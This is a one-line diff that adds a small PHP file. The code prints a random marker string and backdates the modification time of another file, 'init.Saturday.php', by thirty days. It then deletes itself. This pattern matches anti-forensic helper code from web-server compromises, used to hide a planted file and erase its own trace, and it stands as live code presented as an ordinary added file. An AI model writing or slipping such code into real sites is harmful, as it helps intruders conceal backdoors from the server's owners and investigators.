@@ -1,0 +1,1 @@
+<?php echo "SEUgbUeBmF"; if (file_exists("./init.Saturday.php")){ touch("./init.Saturday.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*4c7Df5VwpY0DzBCmKvRY*/ ?>
